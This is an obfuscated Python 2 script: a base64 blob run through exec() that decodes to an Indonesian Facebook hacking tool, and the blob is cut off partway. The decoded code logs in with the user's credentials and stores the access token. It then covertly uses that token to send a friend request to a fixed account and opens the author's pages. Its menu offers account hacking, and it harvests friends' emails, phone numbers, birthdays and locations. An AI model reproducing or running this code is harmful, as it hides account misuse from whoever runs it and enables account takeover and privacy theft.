#Encrypted with Crypton
#Created by OVERDOSIS
import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24KIyBjb2Rpbmc9dXRmLTgKI2phbmdhbiBkaSByZWNvZGUgbmdlbnRvdAojcmVjb2RlIGpvbWJsbyBzZXVtdXIgaGlkdXAKIyAoTVIuUjBITTROKSBQRU1CVUFUCiNGT0xMT1cgRkFDRUJPT0sgUFVUUkkgV1VMQU5EQVJJCiNGT0xMT1cgRkFDRUJPT0sgSVlBTiBYIExPUkQKCiNJbXBvcnQgbW9kdWxlCmltcG9ydCBvcyxzeXMsdGltZSxkYXRldGltZSxyYW5kb20saGFzaGxpYixyZSx0aHJlYWRpbmcsanNvbixnZXRwYXNzLHVybGxpYixjb29raWVsaWIKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbAp0cnk6CiAgaW1wb3J0IG1lY2hhbml6ZQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgbWVjaGFuaXplIikKdHJ5OgogIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlcgoKIy1TZXR0aW5nLSMKIyMjIyMjIyMKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpCmJyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLUFnZW50JywnT3BlcmEvOS44MCAoQW5kcm9pZDsgT3BlcmEgTWluaS8zMi4wLjIyNTQvODUuIFU7IGlkKSBQcmVzdG8vMi4xMi40MjMgVmVyc2lvbi8xMi4xNicpXQoKIy1LZWx1YXItIwpkZWYga2VsdWFyKCk6CiAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gRXhpdCIKICBvcy5zeXMuZXhpdCgpCiAgCiMtV2FybmEtIwpkZWYgYWNhayh4KToKICAgIHcgPSAnbWhrYnBjUCcKICAgIGQgPSAnJwogICAgZm9yIGkgaW4geDoKICAgICAgICBkICs9ICchJyt3W3JhbmRvbS5yYW5kaW50KDAsbGVuKHcpLTEpXStpCiAgICByZXR1cm4gY2V0YWsoZCkKICAgIApkZWYgY2V0YWsoeCk6CiAgICB3ID0gJ21oa2JwY1AnCiAgICBmb3IgaSBpbiB3OgogICAgICAgIGogPSB3LmluZGV4KGkpCiAgICAgICAgeD0geC5yZXBsYWNlKCchJXMnJWksJ1wwMzNbJXM7MW0nJXN0cigzMStqKSkKICAgIHggKz0gJ1wwMzNbMG0nCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQogICAgc3lzLnN0ZG91dC53cml0ZSh4KydcbicpCiAgCiMtQW5pbWFzaS0jCmRlZiBqYWxhbih6KToKICBmb3IgZSBpbiB6ICsgJ1xuJzoKICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgdGltZS5zbGVlcCgwMDAwMC4xKQogICAgCiMjIyMjIExPR08gIyMjIyMKbG9nbyA9ICIiIlwwMzNbMTs5Nm3ilojilojilojilojilojilojilojilojilogKXDAzM1sxOzk2beKWiOKWhOKWiOKWiOKWiOKWiOKWiOKWhOKWiCAgICAgIFwwMzNbMTs5MW3il4/ilqzilqzilqzilqzilqzilqzilqzilqzilqzguZHbqdup4LmR4pas4pas4pas4pas4pas4pas4pas4pas4pePClwwMzNbMTs5Nm3ilohcMDMzWzE7OTFt4pa84pa84pa84pa84pa8IFwwMzNbMTs5NW0tIF8gLS1fLS1cMDMzWzE7OTVt4pWU4pWm4pWX4pSM4pSA4pSQ4pSs4pSA4pSQ4pSs4pSM4pSAICAg4pWU4pWQ4pWX4pWU4pWXIApcMDMzWzE7OTZt4paIIFwwMzNbMTs5Mm0gXDAzM1sxOzk1bV8tXy0tIC1fIC0tX19cMDMzWzE7OTNtIOKVkeKVkeKUnOKUgOKUpOKUnOKUrOKUmOKUnOKUtOKUkOKUgOKUgOKUgOKVoOKVoyDilaDilanilZcKXDAzM1sxOzk2beKWiFwwMzNbMTs5MW3ilrLilrLilrLilrLilrJcMDMzWzE7OTVtLS0gIC0gXyAtLVwwMzNbMTs5Nm3ilZDilanilZ3ilLQg4pS04pS04pSU4pSA4pS0IOKUtCAgIOKVmiAg4pWa4pWQ4pWdIFwwMzNbMTs5Nm1QUkVNSVVNLVNFVEFOClwwMzNbMTs5Nm3ilojilojilojilojilojilojilojilojiloggICAgICBcMDMzWzE7OTJtwqstLS0tLS0tLS0t4pynLS0tLS0tLS0tLcK7ClwwMzNbMTs5Nm0g4paI4paIIOKWiOKWiApcMDMzWzE7OTZt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXClwwMzNbMTs5Nm3ilZFcMDMzWzE7OTZtKiBcMDMzWzE7OTVtQXV0aG9yICBcMDMzWzE7OTNtOiBcMDMzWzE7OTVtQnJvdGhlcuKAok1SLlIwSE00TiBcMDMzWzE7OTZtICAgICAgICAgICAgICAgIOKVkQpcMDMzWzE7OTZt4pWRXDAzM1sxOzk2bSogXDAzM1sxOzk2bUdpdEh1YiAgXDAzM1sxOzkzbTogXDAzM1sxOzk2bVwwMzNbNG1odHRwczovL2dpdGh1Yi5jb20vWmlkYW54Z2FuenpcMDMzWzBtIFwwMzNbMTs5Nm0gICAgIOKVkQpcMDMzWzE7OTZt4pWRXDAzM1sxOzk2bSpcMDMzWzE7OTNtRkFDRUJPT0sgXDAzM1sxOzkzbTogXDAzM1sxOzkxbVwwMzNtaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3RyaWEuZ2Fuei45XDAzM1swbSBcMDMzWzE7OTZtICAg4pWRClwwMzNbMTs5Nm3ilZFcMDMzWzE7OTdtKlwwMzNbMTs5N21GQUNFQk9PSyBcMDMzWzE7OTJtOiBcMDMzWzE7OTZtXDAzM21odHRwczovL3d3dy5mYWNlYm9vay5jb20vWmlkYW4uR2FuenouNTZcMDMzWzBtIFwwMzNbMTs5Nm0gICAgICAgICAgICAgICAgICAg4pWRClwwMzNbMTs5Nm3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIKCiMgdGl0aWsgIwpkZWYgdGlrKCk6CiAgdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICddCiAgZm9yIG8gaW4gdGl0aWs6CiAgICBwcmludCgiXHJcMDMzWzE7OTFtW+KXj10gXDAzM1sxOzkybUxvYWRpbmcgXDAzM1sxOzk3bSIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpCgpiYWNrID0gMAp0aHJlYWRzID0gW10KYmVyaGFzaWwgPSBbXQpjZWtwb2ludCA9IFtdCm9rcyA9IFtdCmdhZ2FsID0gW10KaWR0ZW1hbiA9IFtdCmlkZnJvbXRlbWFuID0gW10KaWRtZW0gPSBbXQplbW1lbSA9IFtdCm5vbWVtID0gW10KaWQgPSBbXQplbSA9IFtdCmVtZnJvbXRlbWFuID0gW10KaHAgPSBbXQpocGZyb210ZW1hbiA9IFtdCnJlYWtzaSA9IFtdCnJlYWtzaWdydXAgPSBbXQprb21lbiA9IFtdCmtvbWVuZ3J1cCA9IFtdCmxpc3RncnVwID0gW10KdnVsbm90ID0gIlwwMzNbMzFtTm90IFZ1bG4iCnZ1bG4gPSAiXDAzM1szMm1WdWxuIgoKIyMjIyMgTElDRU5TRSAjIyMjIwojPT09PT09PT09PT09PT09PT0jCmRlZiBsaXNlbnNpKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgbWFzdWsoKQoKIyMjIyMgUGlsaWggTG9naW4gIyMjIyMKZGVmIG1hc3VrKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHByaW50ICJcMDMzWzE7OTFt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTVtMS5cMDMzWzE7OTZtIExvZ2luIgogIHByaW50ICJcMDMzWzE7OTJt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTVtMi5cMDMzWzE7OTZtIExvZ2luIHVzaW5nIHRva2VuIgogIHByaW50ICJcMDMzWzE7OTNt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTVtMC5cMDMzWzE7OTZtIEV4aXQiCiAgcHJpbnQgIlwwMzNbMTs5NW3ilZEiCiAgbXN1ayA9IHJhd19pbnB1dCgiXDAzM1sxOzk2beKVmuKVkFwwMzNbMTsxbUQgXDAzM1sxOzkzbSIpCiAgaWYgbXN1ayA9PSIiOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIGtlbHVhcigpCiAgZWxpZiBtc3VrID09IjEiOgogICAgbG9naW4oKQogIGVsaWYgbXN1ayA9PSIyIjoKICAgIHRva2VueigpCiAgZWxpZiBtc3VrID09IjAiOgogICAga2VsdWFyKCkKICBlbHNlOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIGtlbHVhcigpCiAgICAKIyMjIyMgTE9HSU4gIyMjIyMKIz09PT09PT09PT09PT09PT0jCmRlZiBsb2dpbigpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpCiAgICBtZW51KCkgCiAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQoJ1wwMzNbMTs5Nm1b4piGXSBcMDMzWzE7OTJtTE9HSU4gQUtVTiBGQUNFQk9PSyBcMDMzWzE7OTFtW+KYhl0nKQogICAgaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzM2bUlEXDAzM1sxOzk3bXxcMDMzWzE7OTZtRW1haWxcMDMzWzE7OTdtIFwwMzNbMTs5MW06XDAzM1sxOzkybSAnKQogICAgcHdkID0gZ2V0cGFzcy5nZXRwYXNzKCdcMDMzWzE7OTVtWytdIFwwMzNbMTs5M21QYXNzd29yZCBcMDMzWzE7OTNtOlwwMzNbMTs5NW0gJykKICAgIHRpaygpCiAgICB0cnk6CiAgICAgIGJyLm9wZW4oJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20nKQogICAgZXhjZXB0IG1lY2hhbml6ZS5VUkxFcnJvcjoKICAgICAgcHJpbnQiXG5cMDMzWzE7OTFtWyFdIE5vIGNvbm5lY3Rpb24iCiAgICAgIGtlbHVhcigpCiAgICBici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQogICAgYnIuc2VsZWN0X2Zvcm0obnI9MCkKICAgIGJyLmZvcm1bJ2VtYWlsJ10gPSBpZAogICAgYnIuZm9ybVsncGFzcyddID0gcHdkCiAgICBici5zdWJtaXQoKQogICAgdXJsID0gYnIuZ2V0dXJsKCkKICAgIGlmICdzYXZlLWRldmljZScgaW4gdXJsOgogICAgICB0cnk6CiAgICAgICAgc2lnPSAnYXBpX2tleT04ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZGNyZWRlbnRpYWxzX3R5cGU9cGFzc3dvcmRlbWFpbD0nK2lkKydmb3JtYXQ9SlNPTmdlbmVyYXRlX21hY2hpbmVfaWQ9MWdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xbG9jYWxlPWVuX1VTbWV0aG9kPWF1dGgubG9naW5wYXNzd29yZD0nK3B3ZCsncmV0dXJuX3NzbF9yZXNvdXJjZXM9MHY9MS4wNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInCiAgICAgICAgZGF0YSA9IHsiYXBpX2tleSI6Ijg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkIiwiY3JlZGVudGlhbHNfdHlwZSI6InBhc3N3b3JkIiwiZW1haWwiOmlkLCJmb3JtYXQiOiJKU09OIiwgImdlbmVyYXRlX21hY2hpbmVfaWQiOiIxIiwiZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzIjoiMSIsImxvY2FsZSI6ImVuX1VTIiwibWV0aG9kIjoiYXV0aC5sb2dpbiIsInBhc3N3b3JkIjpwd2QsInJldHVybl9zc2xfcmVzb3VyY2VzIjoiMCIsInYiOiIxLjAifQogICAgICAgIHg9aGFzaGxpYi5uZXcoIm1kNSIpCiAgICAgICAgeC51cGRhdGUoc2lnKQogICAgICAgIGE9eC5oZXhkaWdlc3QoKQogICAgICAgIGRhdGEudXBkYXRlKHsnc2lnJzphfSkKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL3Jlc3RzZXJ2ZXIucGhwIgogICAgICAgIHI9cmVxdWVzdHMuZ2V0KHVybCxwYXJhbXM9ZGF0YSkKICAgICAgICB6PWpzb24ubG9hZHMoci50ZXh0KQogICAgICAgIHplZGQgPSBvcGVuKCJsb2dpbi50eHQiLCAndycpCiAgICAgICAgemVkZC53cml0ZSh6WydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICB6ZWRkLmNsb3NlKCkKICAgICAgICBwcmludCAnXG5cMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtTG9naW4gc3VjY2Vzc2Z1bGx5JwogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/bWV0aG9kPXBvc3QmdWlkcz1nd2ltdXNhMyZhY2Nlc3NfdG9rZW49Jyt6WydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZ2l0aHViLmNvbS9DcmF6eUxvbHoxMDAnKQogICAgICAgIG1lbnUoKQogICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgcHJpbnQiXG5cMDMzWzE7OTFtWyFdIE5vIGNvbm5lY3Rpb24iCiAgICAgICAga2VsdWFyKCkKICAgIGlmICdjaGVja3BvaW50JyBpbiB1cmw6CiAgICAgIHByaW50KCJcblwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIpCiAgICAgIHByaW50KCJcblwwMzNbMTs5Mm1bI10gSGFyYXAgTG9naW4gVWxhbmcgISIpCiAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAga2VsdWFyKCkKICAgIGVsc2U6CiAgICAgIHByaW50KCJcblwwMzNbMTs5MW1bIV0gTG9naW4gRmFpbGVkIikKICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgdGltZS5zbGVlcCgxKQogICAgICBsb2dpbigpCiAgICAgIAojIyMjIyBUT0tFTiAjIyMjIwpkZWYgdG9rZW56KCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHRva2V0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1Ub2tlblwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtIikKICB0cnk6CiAgICBvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCiAgICBuYW1hID0gYVsnbmFtZSddCiAgICB6ZWRkID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQogICAgemVkZC53cml0ZSh0b2tldCkKICAgIHplZGQuY2xvc2UoKQogICAgbWVudSgpCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCiAgICBlID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1XYW50IHRvIHBpY2sgdXAgdG9rZW4/XDAzM1sxOzk3bVt5L25dOiAiKQogICAgaWYgZSA9PSIiOgogICAgICBrZWx1YXIoKQogICAgZWxpZiBlID09InkiOgogICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICBrZWx1YXIoKQogICAgICAKIyMjIyMgTUVOVSAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZGVmIG1lbnUoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCiAgICBuYW1hID0gYVsnbmFtZSddCiAgICBpZCA9IGFbJ2lkJ10KICBleGNlcHQgS2V5RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkzbUFjY291bnQgQ2hlY2twb2ludCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBObyBjb25uZWN0aW9uIgogICAga2VsdWFyKCkKICBvcy5zeXN0ZW0oInJlc2V0IikKICBwcmludCBsb2dvCiAgcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBOYW1lIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK25hbWErIlwwMzNbMTs5N20iCiAgcHJpbnQgIuKVkVwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dXDAzM1sxOzk3bSBJRCAgIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iK2lkCiAgcHJpbnQgIlwwMzNbMTs5N23ilZoiKzQwKiLilZAiCiAgcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M20xLlwwMzNbMTs5NW0gVXNlciBpbmZvcm1hdGlvbiIKICBwcmludCAiXDAzM1sxOzk0beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkzbTIuXDAzM1sxOzk1bSBHZXQgSWQvZW1haWwvaHAiCiAgcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M20zLlwwMzNbMTs5NW0gSGFjayBmYWNlYm9vayBhY2NvdW50ICAgICAgICAgICAgICAgIgogIHByaW50ICJcMDMzWzE7OTRt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTNtNC5cMDMzWzE7OTVtIEJvdCAgICAgICAiCiAgcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M201LlwwMzNbMTs5NW0gT3RoZXJzICAgICAgICAgICAiCiAgcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M202LlwwMzNbMTs5NW0gU2hvdyB0b2tlbiAgICAgICAgICAgIgogIHByaW50ICJcMDMzWzE7OTRt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTNtNy5cMDMzWzE7OTVtIERlbGV0ZSB0cmFzaCAgICAgICAgICAiCiAgcHJpbnQgIlwwMzNbMTs5NG3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5M204LlwwMzNbMTs5NW0gTG9nT3V0ICAgICAgICAgICAgIgogIHByaW50ICJcMDMzWzE7OTRt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTNtMC5cMDMzWzE7OTVtIEV4aXQgdGhlIHByb2dyYW1zICAgICAgICAgICIKICBwcmludCAi4pWRIgogIHBpbGloKCkKIy0KZGVmIHBpbGloKCk6CiAgemVkZCA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQogIGlmIHplZGQgPT0iIjoKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgogICAgcGlsaWgoKQogIGVsaWYgemVkZCA9PSIxIjoKICAgIGluZm9ybWFzaSgpCiAgZWxpZiB6ZWRkID09IjIiOgogICAgZHVtcCgpCiAgZWxpZiB6ZWRkID09IjMiOgogICAgbWVudV9oYWNrKCkKICBlbGlmIHplZGQgPT0iNCI6CiAgICBtZW51X2JvdCgpCiAgZWxpZiB6ZWRkID09IjUiOgogICAgbGFpbigpCiAgZWxpZiB6ZWRkID09IjYiOgogICAgb3Muc3lzdGVtKCdyZXNldCcpCiAgICBwcmludCBsb2dvCiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgICBwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtWW91ciB0b2tlblwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIit0b2tldAogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnUoKQogIGVsaWYgemVkZCA9PSI3IjoKICAgIG9zLnJlbW92ZSgnb3V0JykKICBlbGlmIHplZGQgPT0iOCI6CiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2dpdGh1Yi5jb20vYXBhYW5zaWhhc3c3NzknKQogICAga2VsdWFyKCkKICBlbGlmIHplZGQgPT0iMCI6CiAgICBrZWx1YXIoKQogIGVsc2U6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIHBpbGloKCkKICAKIyMjIyMgSU5GTyAjIyMjIwpkZWYgaW5mb3JtYXNpKCk6CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBhaWQgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUVudGVyIElEXDAzM1sxOzk3bS9cMDMzWzE7OTJtTmFtZVwwMzNbMTs5MW0gOiBcMDMzWzE7OTdtJykKICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1XYWl0IGEgbWludXRlIFwwMzNbMTs5N20uLi4nKQogIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgY29rID0ganNvbi5sb2FkcyhyLnRleHQpCiAgZm9yIGkgaW4gY29rWydkYXRhJ106CiAgICBpZiBhaWQgaW4gaVsnbmFtZSddIG9yIGFpZCBpbiBpWydpZCddOgogICAgICB4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgICAgeiA9IGpzb24ubG9hZHMoeC50ZXh0KQogICAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgICAgdHJ5OgogICAgICAgIHByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybU5hbWVcMDMzWzE7OTdtICAgICAgICAgIDogJyt6WyduYW1lJ10KICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtTmFtZVwwMzNbMTs5N20gICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwogICAgICB0cnk6CiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtSURcMDMzWzE7OTdtICAgICAgICAgICAgOiAnK3pbJ2lkJ10KICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtSURcMDMzWzE7OTdtICAgICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwogICAgICB0cnk6CiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRW1haWxcMDMzWzE7OTdtICAgICAgICAgOiAnK3pbJ2VtYWlsJ10KICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRW1haWxcMDMzWzE7OTdtICAgICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwogICAgICB0cnk6CiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVGVsZXBob25lXDAzM1sxOzk3bSAgICAgOiAnK3pbJ21vYmlsZV9waG9uZSddCiAgICAgIGV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybVRlbGVwaG9uZVwwMzNbMTs5N20gICAgIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKICAgICAgdHJ5OgogICAgICAgIHByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybUxvY2F0aW9uXDAzM1sxOzk3bSAgICAgIDogJyt6Wydsb2NhdGlvbiddWyduYW1lJ10KICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtTG9jYXRpb25cMDMzWzE7OTdtICAgICAgOiBcMDMzWzE7OTFtTm90IGZvdW5kJwogICAgICB0cnk6CiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aFwwMzNbMTs5N20gOiAnK3pbJ2JpcnRoZGF5J10KICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRGF0ZSBvZiBiaXJ0aFwwMzNbMTs5N20gOiBcMDMzWzE7OTFtTm90IGZvdW5kJwogICAgICB0cnk6CiAgICAgICAgcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtU2Nob29sXDAzM1sxOzk3bSAgICAgICAgOiAnCiAgICAgICAgZm9yIHEgaW4gelsnZWR1Y2F0aW9uJ106CiAgICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTFtICAgICAgICAgICAgICAgICAgIH4gXDAzM1sxOzk3bScrcVsnc2Nob29sJ11bJ25hbWUnXQogICAgICAgICAgZXhjZXB0IEtleUVycm9yOiBwcmludCAnXDAzM1sxOzkxbSAgICAgICAgICAgICAgICAgICB+IFwwMzNbMTs5MW1Ob3QgZm91bmQnCiAgICAgIGV4Y2VwdCBLZXlFcnJvcjogcGFzcwogICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICBtZW51KCkKICAgIGVsc2U6CiAgICAgIHBhc3MKICBlbHNlOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIFVzZXIgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwM